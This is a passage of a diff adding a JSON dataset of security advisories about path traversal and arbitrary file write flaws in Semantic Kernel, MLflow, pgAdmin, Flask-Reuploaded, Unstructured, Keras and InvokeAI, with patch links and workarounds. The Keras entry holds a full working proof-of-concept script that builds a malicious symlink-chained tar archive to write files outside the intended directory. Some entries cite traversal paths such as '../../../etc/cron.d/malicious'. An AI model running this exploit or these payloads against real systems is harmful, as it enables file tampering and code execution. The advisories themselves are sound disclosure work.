@@ -1,0 +1,463 @@
+[
+  {
+    "ghsa_id": "GHSA-2ww3-72rp-wpp4",
+    "cve_id": "CVE-2026-25592",
+    "summary": "Semantic Kernel has Arbitrary File Write via AI Agent Function Calling in .NET SDK",
+    "description": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\nAn Arbitrary File Write vulnerability has been identified in Microsoft's Semantic Kernel .NET SDK, specifically within the `SessionsPythonPlugin`.\nDevelopers who have built applications which include Microsoft's Semantic Kernel .NET SDK and are using the `SessionsPythonPlugin`\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\nThe problem has been fixed in [Microsoft.SemanticKernel.Plugins.Core version 1.71.0](https://www.nuget.org/packages/Microsoft.SemanticKernel.Plugins.Core/1.71.0). Users should upgrade to version 1.71.0 or higher.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\nUsers can create a [Function Invocation Filter](https://learn.microsoft.com/en-us/semantic-kernel/concepts/enterprise-readiness/filters?pivots=programming-language-csharp#function-invocation-filter) which checks the arguments being passed to any calls to `DownloadFileAsync ` or `UploadFileAsync` and ensures the provided `localFilePath` is allow listed.\n\n### References\n_Are there any links users can visit to find out more?_\n- [Sample showing safe use of the CodeInterpreterPlugin](https://github.com/microsoft/semantic-kernel/blob/main/dotnet/samples/Demos/CodeInterpreterPlugin/Program.cs#L61-L64)\n- [PR to Add file upload security controls to SessionsPythonPlugin](https://github.com/microsoft/semantic-kernel/pull/13478/changes#diff-88d3cacba2bfa84eef8f2aa171b34f9940338cbb784a3ffc49f5fe3af1b8943d)",
+    "severity": "critical",
+    "cvss_score": 10.0,
+    "cwes": [
+      "CWE-22"
+    ],
+    "published_at": "2026-02-06T18:37:24Z",
+    "references": [
+      "https://github.com/microsoft/semantic-kernel/security/advisories/GHSA-2ww3-72rp-wpp4",
+      "https://github.com/microsoft/semantic-kernel/pull/13478/changes#diff-88d3cacba2bfa84eef8f2aa171b34f9940338cbb784a3ffc49f5fe3af1b8943d",
+      "https://github.com/microsoft/semantic-kernel/blob/main/dotnet/samples/Demos/CodeInterpreterPlugin/Program.cs#L61-L64",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-25592",
+      "https://github.com/advisories/GHSA-2ww3-72rp-wpp4"
+    ],
+    "patch_urls": [
+      "https://github.com/microsoft/semantic-kernel/pull/13478/changes#diff-88d3cacba2bfa84eef8f2aa171b34f9940338cbb784a3ffc49f5fe3af1b8943d"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "semantic-kernel",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 1.39.3"
+      },
+      {
+        "package": "Microsoft.SemanticKernel.Core",
+        "ecosystem": "nuget",
+        "vulnerable_range": "< 1.71.0"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-x422-6qhv-p29g",
+    "cve_id": "CVE-2023-2356",
+    "summary": "Relative path traversal in mlflow",
+    "description": "Relative Path Traversal in GitHub repository mlflow/mlflow prior to 2.3.1.",
+    "severity": "high",
+    "cvss_score": 10.0,
+    "cwes": [
+      "CWE-23"
+    ],
+    "published_at": "2023-04-28T00:30:29Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-2356",
+      "https://github.com/mlflow/mlflow/commit/f73147496e05c09a8b83d95fb4f1bf86696c6342",
+      "https://huntr.dev/bounties/7b5d130d-38eb-4133-8c7d-0dfc9a9d9896",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/mlflow/PYSEC-2023-68.yaml",
+      "https://github.com/advisories/GHSA-x422-6qhv-p29g"
+    ],
+    "patch_urls": [
+      "https://github.com/mlflow/mlflow/commit/f73147496e05c09a8b83d95fb4f1bf86696c6342"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "mlflow",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 2.3.1"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-5q6c-ffvg-xcm9",
+    "cve_id": "CVE-2024-0520",
+    "summary": "Remote code execution in mlflow",
+    "description": "A vulnerability in mlflow/mlflow version 8.2.1 allows for remote code execution due to improper neutralization of special elements used in an OS command ('Command Injection') within the `mlflow.data.http_dataset_source.py` module. Specifically, when loading a dataset from a source URL with an HTTP scheme, the filename extracted from the `Content-Disposition` header or the URL path is used to generate the final file path without proper sanitization. This flaw enables an attacker to control the file path fully by utilizing path traversal or absolute path techniques, such as '../../tmp/poc.txt' or '/tmp/poc.txt', leading to arbitrary file write. Exploiting this vulnerability could allow a malicious user to execute commands on the vulnerable machine, potentially gaining access to data and model information. The issue is fixed in version 2.9.0.",
+    "severity": "critical",
+    "cvss_score": 10.0,
+    "cwes": [
+      "CWE-22",
+      "CWE-23"
+    ],
+    "published_at": "2024-06-06T21:30:35Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-0520",
+      "https://github.com/mlflow/mlflow/commit/400c226953b4568f4361bc0a0c223511652c2b9d",
+      "https://huntr.com/bounties/93e470d7-b6f0-409b-af63-49d3e2a26dbc",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/mlflow/PYSEC-2024-239.yaml",
+      "https://github.com/advisories/GHSA-5q6c-ffvg-xcm9"
+    ],
+    "patch_urls": [
+      "https://github.com/mlflow/mlflow/commit/400c226953b4568f4361bc0a0c223511652c2b9d"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "mlflow",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 2.9.0"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-rj98-crf4-g69w",
+    "cve_id": "CVE-2024-2044",
+    "summary": "pgAdmin 4 vulnerable to Unsafe Deserialization and Remote Code Execution by an Authenticated user",
+    "description": "pgAdmin prior to version 8.4 is affected by a path-traversal vulnerability while deserializing users’ sessions in the session handling code. If the server is running on Windows, an unauthenticated attacker can load and deserialize remote pickle objects and gain code execution. If the server is running on POSIX/Linux, an authenticated attacker can upload pickle objects, deserialize them and gain code execution.",
+    "severity": "critical",
+    "cvss_score": 10.0,
+    "cwes": [
+      "CWE-22",
+      "CWE-31",
+      "CWE-502"
+    ],
+    "published_at": "2024-03-07T21:30:22Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-2044",
+      "https://github.com/pgadmin-org/pgadmin4/issues/7258",
+      "https://github.com/pgadmin-org/pgadmin4/commit/4e49d752fba72953acceeb7f4aa2e6e32d25853d",
+      "https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce",
+      "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LUYN2JXKKHFSVTASH344TBRGWDH64XQV",
+      "https://github.com/advisories/GHSA-rj98-crf4-g69w"
+    ],
+    "patch_urls": [
+      "https://github.com/pgadmin-org/pgadmin4/commit/4e49d752fba72953acceeb7f4aa2e6e32d25853d"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "pgAdmin4",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 8.4"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-554w-xh4j-8w64",
+    "cve_id": "CVE-2023-6831",
+    "summary": "Path traversal in MLflow",
+    "description": "Path Traversal: '\\..\\filename' in GitHub repository mlflow/mlflow prior to 2.9.2.",
+    "severity": "critical",
+    "cvss_score": 10.0,
+    "cwes": [
+      "CWE-22",
+      "CWE-29"
+    ],
+    "published_at": "2023-12-15T03:30:18Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-6831",
+      "https://github.com/mlflow/mlflow/commit/1da75dfcecd4d169e34809ade55748384e8af6c1",
+      "https://huntr.com/bounties/0acdd745-0167-4912-9d5c-02035fe5b314",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/mlflow/PYSEC-2023-253.yaml",
+      "https://github.com/advisories/GHSA-554w-xh4j-8w64"
+    ],
+    "patch_urls": [
+      "https://github.com/mlflow/mlflow/commit/1da75dfcecd4d169e34809ade55748384e8af6c1"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "mlflow",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 2.9.2"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-f798-qm4r-23r5",
+    "cve_id": "CVE-2023-6015",
+    "summary": "MLflow allowed arbitrary files to be PUT onto the server",
+    "description": "MLflow allowed arbitrary files to be PUT onto the server.",
+    "severity": "critical",
+    "cvss_score": 10.0,
+    "cwes": [
+      "CWE-22"
+    ],
+    "published_at": "2023-11-16T18:30:31Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-6015",
+      "https://huntr.com/bounties/43e6fb72-676e-4670-a225-15d6836f65d3",
+      "https://github.com/mlflow/mlflow/pull/10330",
+      "https://github.com/mlflow/mlflow/commit/cf83dad4df26dd4a850622fe8a51ccab1471a5e7",
+      "https://github.com/advisories/GHSA-f798-qm4r-23r5"
+    ],
+    "patch_urls": [
+      "https://github.com/mlflow/mlflow/pull/10330",
+      "https://github.com/mlflow/mlflow/commit/cf83dad4df26dd4a850622fe8a51ccab1471a5e7"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "mlflow",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 2.8.1"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-65mp-fq8v-56jr",
+    "cve_id": "CVE-2026-27641",
+    "summary": "Flask-Reuploaded vulnerable to Remote Code Execution via Server-Side Template Injection",
+    "description": "### Impact\nA critical path traversal and extension bypass vulnerability in Flask-Reuploaded allows remote attackers to achieve arbitrary file write and remote code execution through Server-Side Template Injection (SSTI).\n\n### Patches\nFlask-Reuploaded has been patched in version 1.5.0\n\n### Workarounds\n\n1. **Do not pass user input to the `name` parameter**\n2. Use auto-generated filenames only\n3. Implement strict input validation if `name` must be used\n\n```python\nfrom werkzeug.utils import secure_filename\nimport os\n\n# Sanitize user input before passing to save()\nsafe_name = secure_filename(request.form.get('custom_name'))\n# Remove path separators\nsafe_name = os.path.basename(safe_name)\n# Validate extension matches policy\nif not photos.extension_allowed(photos.get_extension(safe_name)):\n    abort(400)\n    \nfilename = photos.save(file, name=safe_name)\n```\n\n### Resources\nThe fix is documented in the pull request, see https://github.com/jugmac00/flask-reuploaded/pull/180.\n\nA proper write-up was created by the reporter of the vulnerability, Jaron Cabral (https://www.linkedin.com/in/jaron-cabral-751994357/), but is not yet available as of time of this publication.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-22",
+      "CWE-1336"
+    ],
+    "published_at": "2026-02-25T19:06:50Z",
+    "references": [
+      "https://github.com/jugmac00/flask-reuploaded/security/advisories/GHSA-65mp-fq8v-56jr",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-27641",
+      "https://github.com/jugmac00/flask-reuploaded/pull/180",
+      "https://github.com/jugmac00/flask-reuploaded/commit/d64c6b2f71cb73734fc38baa0e3e156926361288",
+      "https://github.com/advisories/GHSA-65mp-fq8v-56jr"
+    ],
+    "patch_urls": [
+      "https://github.com/jugmac00/flask-reuploaded/pull/180",
+      "https://github.com/jugmac00/flask-reuploaded/commit/d64c6b2f71cb73734fc38baa0e3e156926361288"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "flask-reuploaded",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 1.5.0"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-gm8q-m8mv-jj5m",
+    "cve_id": "CVE-2025-64712",
+    "summary": "Unstructured has Path Traversal via Malicious MSG Attachment that Allows Arbitrary File Write",
+    "description": "A Path Traversal vulnerability in the `partition_msg` function allows an attacker to write or overwrite arbitrary files on the filesystem when processing malicious MSG files with attachments.\n\n  ## Impact\n  An attacker can craft a malicious .msg file with attachment filenames containing path traversal sequences (e.g.,\n  `../../../etc/cron.d/malicious`). When processed with `process_attachments=True`, the library writes the attachment to an\n  attacker-controlled path, potentially leading to:\n\n  - Arbitrary file overwrite\n  - Remote code execution (via overwriting configuration files, cron jobs, or Python packages)\n  - Data corruption\n  - Denial of service\n\n  ## Affected Functionality\n  The vulnerability affects the MSG file partitioning functionality when `process_attachments=True` is enabled.\n\n  ## Vulnerability Details\n  The library does not sanitize attachment filenames in MSG files before using them in file write operations, allowing directory\n  traversal sequences to escape the intended output directory.\n\n  ## Workarounds\n  Until patched, users can:\n  - Set `process_attachments=False` when processing untrusted MSG files\n  - Avoid processing MSG files from untrusted sources\n  - Implement additional filename validation before processing",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-22",
+      "CWE-73"
+    ],
+    "published_at": "2026-02-03T17:43:56Z",
+    "references": [
+      "https://github.com/Unstructured-IO/unstructured/security/advisories/GHSA-gm8q-m8mv-jj5m",
+      "https://github.com/Unstructured-IO/unstructured/commit/b01d35b2373fd087d2e15162b9c021663c97155d",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-64712",
+      "https://github.com/advisories/GHSA-gm8q-m8mv-jj5m"
+    ],
+    "patch_urls": [
+      "https://github.com/Unstructured-IO/unstructured/commit/b01d35b2373fd087d2e15162b9c021663c97155d"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "unstructured",
+        "ecosystem": "pip",
+        "vulnerable_range": "<= 0.18.17"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-hjqc-jx6g-rwp9",
+    "cve_id": "CVE-2025-12060",
+    "summary": "Keras Directory Traversal Vulnerability",
+    "description": "## Summary\n\nKeras's `keras.utils.get_file()` function is vulnerable to directory traversal attacks despite implementing `filter_safe_paths()`. The vulnerability exists because `extract_archive()` uses Python's `tarfile.extractall()` method without the security-critical `filter=\"data\"` parameter. A PATH_MAX symlink resolution bug occurs before path filtering, allowing malicious tar archives to bypass security checks and write files outside the intended extraction directory.\n\n## Details\n\n### Root Cause Analysis\n\n**Current Keras Implementation**\n```python\n# From keras/src/utils/file_utils.py#L121\nif zipfile.is_zipfile(file_path):\n    # Zip archive.\n    archive.extractall(path)\nelse:\n    # Tar archive, perhaps unsafe. Filter paths.\n    archive.extractall(path, members=filter_safe_paths(archive))\n```\n\n### The Critical Flaw\n\nWhile Keras attempts to filter unsafe paths using `filter_safe_paths()`, this filtering happens after the tar archive members are parsed and before actual extraction. However, the PATH_MAX symlink resolution bug occurs during extraction, not during member enumeration.\n\n**Exploitation Flow:**\n1. **Archive parsing**: `filter_safe_paths()` sees symlink paths that appear safe\n2. **Extraction begins**: `extractall()` processes the filtered members\n3. **PATH_MAX bug triggers**: Symlink resolution fails due to path length limits\n4. **Security bypass**: Failed resolution causes literal path interpretation\n5. **Directory traversal**: Files written outside intended directory\n\n### Technical Details\n\nThe vulnerability exploits a known issue in Python's `tarfile` module where excessively long symlink paths can cause resolution failures, leading to the symlink being treated as a literal path. This bypasses Keras's path filtering because:\n\n- `filter_safe_paths()` operates on the parsed tar member information\n- The PATH_MAX bug occurs during actual file system operations in `extractall()`\n- Failed symlink resolution falls back to literal path interpretation\n- This allows traversal paths like `../../../../etc/passwd` to be written\n\n### Affected Code Location\n\n**File**: `keras/src/utils/file_utils.py`  \n**Function**: `extract_archive()` around line 121  \n**Issue**: Missing `filter=\"data\"` parameter in `tarfile.extractall()`\n\n## Proof of Concept\n```\n#!/usr/bin/env python3\nimport os, io, sys, tarfile, pathlib, platform, threading, time\nimport http.server, socketserver\n\n# Import Keras directly (not through TensorFlow)\ntry:\n    import keras\n    print(\"Using standalone Keras:\", keras.__version__)\n    get_file = keras.utils.get_file\nexcept ImportError:\n    try:\n        import tensorflow as tf\n        print(\"Using Keras via TensorFlow:\", tf.keras.__version__)\n        get_file = tf.keras.utils.get_file\n    except ImportError:\n        print(\"Neither Keras nor TensorFlow found!\")\n        sys.exit(1)\n\nprint(\"=\" * 60)\nprint(\"Keras get_file() PATH_MAX Symlink Vulnerability PoC\")\nprint(\"=\" * 60)\nprint(\"Python:\", sys.version.split()[0])\nprint(\"Platform:\", platform.platform())\n\nroot = pathlib.Path.cwd()\nprint(f\"Working directory: {root}\")\n\n# Create target directory for exploit demonstration\nexploit_dir = root / \"exploit\"\nexploit_dir.mkdir(exist_ok=True)\n\n# Clean up any previous exploit files\ntry:\n    (exploit_dir / \"keras_pwned.txt\").unlink()\nexcept FileNotFoundError:\n    pass\n\nprint(f\"\\n=== INITIAL STATE ===\")\nprint(f\"Exploit directory: {exploit_dir}\")\nprint(f\"Files in exploit/: {[f.name for f in exploit_dir.iterdir()]}\")\n\n# Create malicious tar with PATH_MAX symlink resolution bug\nprint(f\"\\n=== Building PATH_MAX Symlink Exploit ===\")\n\n# Parameters for PATH_MAX exploitation\ncomp = 'd' * (55 if sys.platform == 'darwin' else 247)\nsteps = \"abcdefghijklmnop\"  # 16-step symlink chain\npath = \"\"\n\nwith tarfile.open(\"keras_dataset.tgz\", mode=\"w:gz\") as tar:\n    print(\"Creating deep symlink chain...\")\n    \n    # Build the symlink chain that will exceed PATH_MAX during resolution\n    for i, step in enumerate(steps):\n        # Directory with long name\n        dir_info = tarfile.TarInfo(os.path.join(path, comp))\n        dir_info.type = tarfile.DIRTYPE\n        tar.addfile(dir_info)\n        \n        # Symlink pointing to that directory\n        link_info = tarfile.TarInfo(os.path.join(path, step))\n        link_info.type = tarfile.SYMTYPE\n        link_info.linkname = comp\n        tar.addfile(link_info)\n        \n        path = os.path.join(path, comp)\n        \n        if i < 3 or i % 4 == 0:  # Print progress for first few and every 4th\n            print(f\"  Step {i+1}: {step} -> {comp[:20]}...\")\n    \n    # Create the final symlink that exceeds PATH_MAX\n    # This is where the symlink resolution breaks down\n    long_name = \"x\" * 254\n    linkpath = os.path.join(\"/\".join(steps), long_name)\n    \n    max_link = tarfile.TarInfo(linkpath)\n    max_link.type = tarfile.SYMTYPE\n    max_link.linkname = (\"../\" * len(steps))\n    tar.addfile(max_link)\n    \n    print(f\"✓ Created PATH_MAX symlink: {len(linkpath)} characters\")\n    print(f\"  Points to: {'../' * len(steps)}\")\n    \n    # Exploit file through the broken symlink resolution\n    exploit_path = linkpath + \"/../../../exploit/keras_pwned.txt\"\n    exploit_content = b\"KERAS VULNERABILITY CONFIRMED!\\nThis file was created outside the cache directory!\\nKeras get_file() is vulnerable to PATH_MAX symlink attacks!\\n\"\n    \n    exploit_file = tarfile.TarInfo(exploit_path)\n    exploit_file.type = tarfile.REGTYPE\n    exploit_file.size = len(exploit_content)\n    tar.addfile(exploit_file, fileobj=io.BytesIO(exploit_content))\n    \n    print(f\"✓ Added exploit file via broken symlink path\")\n    \n    # Add legitimate dataset content\n    dataset_content = b\"# Keras Dataset Sample\\nThis appears to be a legitimate ML dataset\\nimage1.jpg,cat\\nimage2.jpg,dog\\nimage3.jpg,bird\\n\"\n    dataset_file = tarfile.TarInfo(\"dataset/labels.csv\")\n    dataset_file.type = tarfile.REGTYPE\n    dataset_file.size = len(dataset_content)\n    tar.addfile(dataset_file, fileobj=io.BytesIO(dataset_content))\n    \n    # Dataset directory\n    dataset_dir = tarfile.TarInfo(\"dataset/\")\n    dataset_dir.type = tarfile.DIRTYPE\n    tar.addfile(dataset_dir)\n\nprint(\"✓ Malicious Keras dataset created\")\n\n# Comparison Test: Python tarfile with filter (SAFE)\nprint(f\"\\n=== COMPARISON: Python tarfile with data filter ===\")\ntry:\n    with tarfile.open(\"keras_dataset.tgz\", \"r:gz\") as tar:\n        tar.extractall(\"python_safe\", filter=\"data\")\n    \n    files_after = [f.name for f in exploit_dir.iterdir()]\n    print(f\"✓ Python safe extraction completed\")\n    print(f\"Files in exploit/: {files_after}\")\n    \n    # Cleanup\n    import shutil\n    if pathlib.Path(\"python_safe\").exists():\n        shutil.rmtree(\"python_safe\", ignore_errors=True)\n        \nexcept Exception as e:\n    print(f\"❌ Python safe extraction blocked: {str(e)[:80]}...\")\n    files_after = [f.name for f in exploit_dir.iterdir()]\n    print(f\"Files in exploit/: {files_after}\")\n\n# Start HTTP server to serve malicious archive\nclass SilentServer(http.server.SimpleHTTPRequestHandler):\n    def log_message(self, *args): pass\n\ndef run_server():\n    with socketserver.TCPServer((\"127.0.0.1\", 8005), SilentServer) as httpd:\n        httpd.allow_reuse_address = True\n        httpd.serve_forever()\n\nserver = threading.Thread(target=run_server, daemon=True)\nserver.start()\ntime.sleep(0.3)\n\n# Keras vulnerability test\ncache_dir = root / \"keras_cache\"\ncache_dir.mkdir(exist_ok=True)\nurl = \"http://127.0.0.1:8005/keras_dataset.tgz\"\n\nprint(f\"\\n=== KERAS VULNERABILITY TEST ===\")\nprint(f\"Testing: keras.utils.get_file() with extract=True\")\nprint(f\"URL: {url}\")\nprint(f\"Cache: {cache_dir}\")\nprint(f\"Expected extraction: keras_cache/datasets/keras_dataset/\")\nprint(f\"Exploit target: exploit/keras_pwned.txt\")\n\ntry:\n    # The vulnerable Keras call\n    extracted_path = get_file(\n        \"keras_dataset\",\n        url,\n        cache_dir=str(cache_dir),\n        extract=True\n    )\n    print(f\"✓ Keras extraction completed\")\n    print(f\"✓ Returned path: {extracted_path}\")\n    \nexcept Exception as e:\n    print(f\"❌ Keras extraction failed: {e}\")\n    import traceback\n    traceback.print_exc()\n\n# Vulnerability assessment\nprint(f\"\\n=== VULNERABILITY RESULTS ===\")\nfinal_exploit_files = [f.name for f in exploit_dir.iterdir()]\nprint(f\"Files in exploit directory: {final_exploit_files}\")\n\nif \"keras_pwned.txt\" in final_exploit_files:\n    print(f\"\\n🚨 KERAS VULNERABILITY CONFIRMED! 🚨\")\n    \n    exploit_file = exploit_dir / \"keras_pwned.txt\"\n    content = exploit_file.read_text()\n    print(f\"Exploit file created: {exploit_file}\")\n    print(f\"Content:\\n{content}\")\n    \n    print(f\"🔍 TECHNICAL DETAILS:\")\n    print(f\"   • Keras uses tarfile.extractall() without filter parameter\")\n    print(f\"   • PATH_MAX symlink resolution bug bypassed security checks\")\n    print(f\"   • File created outside intended cache directory\")\n    print(f\"   • Same vulnerability pattern as TensorFlow get_file()\")\n    \n    print(f\"\\n📊 COMPARISON RESULTS:\")\n    print(f\"   ✅ Python with filter='data': BLOCKED exploit\")\n    print(f\"   ⚠️  Keras get_file(): ALLOWED exploit\")\n    \nelse:\n    print(f\"✅ No exploit files detected\")\n    print(f\"Possible reasons:\")\n    print(f\"   • Keras version includes security patches\")\n    print(f\"   • Platform-specific path handling prevented exploit\")\n    print(f\"   • Archive extraction path differed from expected\")\n\n# Show what Keras actually extracted (safely)\nprint(f\"\\n=== KERAS EXTRACTION ANALYSIS ===\")\ntry:\n    if 'extracted_path' in locals() and pathlib.Path(extracted_path).exists():\n        keras_path = pathlib.Path(extracted_path)\n        print(f\"Keras extracted to: {keras_path}\")\n        \n        # Safely list contents\n        try:\n            contents = [item.name for item in keras_path.iterdir()]\n            print(f\"Top-level contents: {contents}\")\n            \n            # Count symlinks (indicates our exploit structure was created)\n            symlink_count = 0\n            for item in keras_path.iterdir():\n                try:\n                    if item.is_symlink():\n                        symlink_count += 1\n                except PermissionError:\n                    continue\n            \n            print(f\"Symlinks created: {symlink_count}\")\n            if symlink_count > 0:\n                print(f\"✓ PATH_MAX symlink chain was extracted\")\n                \n        except PermissionError:\n            print(f\"Permission errors in extraction directory (expected with symlink corruption)\")\n            \nexcept Exception as e:\n    print(f\"Could not analyze Keras extraction: {e}\")\n\nprint(f\"\\n=== REMEDIATION ===\")\nprint(f\"To fix this vulnerability, Keras should use:\")\nprint(f\"```python\")\nprint(f\"tarfile.extractall(path, filter='data')  # Safe\")\nprint(f\"```\")\nprint(f\"Instead of:\")\nprint(f\"```python\") \nprint(f\"tarfile.extractall(path)  # Vulnerable\")\nprint(f\"```\")\n\n# Cleanup\nprint(f\"\\n=== CLEANUP ===\")\ntry:\n    os.unlink(\"keras_dataset.tgz\")\n    print(f\"✓ Removed malicious tar file\")\nexcept:\n    pass\n\nprint(\"PoC completed!\")\n\n```\n### Environment Setup\n- **Python**: 3.8+ (tested on multiple versions)\n- **Keras**: Standalone Keras or TensorFlow.Keras\n- **Platform**: Linux, macOS, Windows (path handling varies)\n\n### Exploitation Steps\n\n1. **Create malicious tar archive** with PATH_MAX symlink chain\n2. **Host archive** on accessible HTTP server\n3. **Call `keras.utils.get_file()`** with `extract=True`\n4. **Observe directory traversal** - files written outside cache directory\n\n### Key Exploit Components\n\n- **Deep symlink chain**: 16+ nested symlinks with long directory names\n- **PATH_MAX overflow**: Final symlink path exceeding system limits\n- **Traversal payload**: Relative path traversal (`../../../target/file`)\n- **Legitimate disguise**: Archive contains valid-looking dataset files\n\n### Demonstration Results\n\n**Vulnerable behavior:**\n- Files extracted outside intended `cache_dir/datasets/` location\n- Security filtering bypassed completely\n- No error or warning messages generated\n\n**Expected secure behavior:**\n- Extraction blocked or confined to cache directory\n- Security warnings for suspicious archive contents\n\n## Impact\n\n### Vulnerability Classification\n- **Type**: Directory Traversal / Path Traversal (CWE-22)\n- **Severity**: High\n- **CVSS Components**: Network accessible, no authentication required, impacts confidentiality and integrity\n\n### Who Is Impacted\n\n**Direct Impact:**\n- Applications using `keras.utils.get_file()` with `extract=True`\n- Machine learning pipelines downloading and extracting datasets\n- Automated ML training systems processing external archives\n\n**Attack Scenarios:**\n1. **Malicious datasets**: Attacker hosts compromised ML dataset\n2. **Supply chain**: Legitimate dataset repositories compromised\n3. **Model poisoning**: Extraction writes malicious files alongside training data\n4. **System compromise**: Configuration files, executables written to system directories\n\n**Affected Environments:**\n- Research environments downloading public datasets\n- Production ML systems with automated dataset fetching\n- Educational platforms using Keras for tutorials\n- CI/CD pipelines training models with external data\n\n### Risk Assessment\n\n**High Risk Factors:**\n- Common usage pattern in ML workflows\n- No user awareness of extraction security\n- Silent failure mode (no warnings)\n- Cross-platform vulnerability\n\n**Potential Consequences:**\n- Arbitrary file write on target system\n- Configuration file tampering\n- Code injection via overwritten scripts\n- Data exfiltration through planted files\n- System compromise in containerized environments\n\n## Recommended Fix\n\n### Immediate Mitigation\n\nReplace the vulnerable extraction code with:\n\n```python\n# Secure implementation\nif zipfile.is_zipfile(file_path):\n    # Zip archive - implement similar filtering\n    archive.extractall(path, members=filter_safe_paths(archive))\nelse:\n    # Tar archive with proper security filter\n    archive.extractall(path, members=filter_safe_paths(archive), filter=\"data\")\n```\n\n### Long-term Solution\n\n1. **Add `filter=\"data\"` parameter** to all `tarfile.extractall()` calls\n2. **Implement comprehensive path validation** before extraction\n3. **Add extraction logging** for security monitoring\n4. **Consider sandboxed extraction** for untrusted archives\n5. **Update documentation** to warn about archive security risks\n\n### Backward Compatibility\n\nThe fix maintains full backward compatibility as `filter=\"data\"` is the recommended secure default for Python 3.12+.\n\n## References\n\n- [[Python tarfile security documentation](https://docs.python.org/3/library/tarfile.html#extraction-filters)](https://docs.python.org/3/library/tarfile.html#extraction-filters)\n- [[CVE-2007-4559](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4559)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4559) - Related tarfile vulnerability\n- [[OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)](https://owasp.org/www-community/attacks/Path_Traversal)\n\nNote: Reported in Huntr as well, but didn't get response\nhttps://huntr.com/bounties/f94f5beb-54d8-4e6a-8bac-86d9aee103f4",
+    "severity": "high",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-22"
+    ],
+    "published_at": "2025-12-02T00:58:33Z",
+    "references": [
+      "https://github.com/keras-team/keras/security/advisories/GHSA-hjqc-jx6g-rwp9",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-12060",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-12638",
+      "https://github.com/keras-team/keras/pull/21760",
+      "https://github.com/keras-team/keras/commit/47fcb397ee4caffd5a75efd1fa3067559594e951",
+      "https://huntr.com/bounties/f94f5beb-54d8-4e6a-8bac-86d9aee103f4",
+      "https://github.com/advisories/GHSA-hjqc-jx6g-rwp9"
+    ],
+    "patch_urls": [
+      "https://github.com/keras-team/keras/pull/21760",
+      "https://github.com/keras-team/keras/commit/47fcb397ee4caffd5a75efd1fa3067559594e951"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "keras",
+        "ecosystem": "pip",
+        "vulnerable_range": "<= 3.11.3"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-vv9c-xxg7-wmv7",
+    "cve_id": "CVE-2025-6237",
+    "summary": "InvokeAI has External Control of File Name or Path",
+    "description": "### Path Traversal Vulnerability in InvokeAI\n\nA path traversal vulnerability in **InvokeAI** (versions < 6.7.0) allows an unauthenticated remote attacker to read files outside the intended media directory via the **bulk downloads** API.\n\nThe endpoint accepts a user-controlled file/item name and concatenates it into a filesystem path without proper canonicalization or allow-listing. By supplying sequences such as `../` (or absolute paths), an attacker can cause the server to traverse directories and return arbitrary files.\n\nIn certain storage or back-end configurations, abusing attacker-controlled paths can also lead to unintended overwriting or deletion of files referenced by the crafted path.\n\nThe issue is fixed in **6.7.0**, which normalizes and validates input paths and rejects traversal attempts.\n\n**Affected versions:** `< 6.7.0`\n**Patched version:** `6.7.0`",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-22",
+      "CWE-73"
+    ],
+    "published_at": "2025-09-18T09:31:13Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-6237",
+      "https://huntr.com/bounties/54ac9589-7c88-4fd4-8512-8b2f19fbaedf",
+      "https://github.com/invoke-ai/InvokeAI/blob/v6.0.0a1/invokeai/app/api/routers/images.py#L493-L524",
+      "https://github.com/invoke-ai/InvokeAI/pull/8548/commits/eff565ae6ace1c8458f187245690bff0513f1b9e",
+      "https://github.com/invoke-ai/InvokeAI/releases/tag/v6.7.0",
+      "https://github.com/advisories/GHSA-vv9c-xxg7-wmv7"
+    ],
